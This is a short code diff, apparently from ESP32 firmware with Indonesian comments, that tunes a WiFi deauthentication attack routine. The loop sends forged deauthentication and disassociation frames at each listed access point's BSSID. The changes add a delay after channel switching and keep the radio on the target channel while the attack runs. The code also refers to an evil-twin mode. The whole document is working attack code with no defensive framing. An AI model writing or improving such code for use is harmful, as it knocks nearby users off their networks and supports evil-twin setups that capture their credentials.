@@ -196,6 +196,7 @@ void deauthStep(){
     if(aps[i].ch == 0) continue;
     const uint8_t* b = aps[i].bssid;
     uint8_t ch = aps[i].ch;
+    delay(4);                        // radio settle setelah pindah kanal
     sendDeauth(0xC0, 7, b, ch);
     sendDeauth(0xC0, 1, b, ch);
     sendDeauth(0xA0, 7, b, ch);
@@ -205,7 +206,8 @@ void deauthStep(){
   }
   sentFrames += hit * 5;
 
-  if(!twinOn) esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  // tetap di kanal target selama menyerang (bukan balik ke kanal 1)
+  if(!deauthOn && !twinOn) esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
 }
 
 // ---------------- tombol fisik ----------------------------------------------
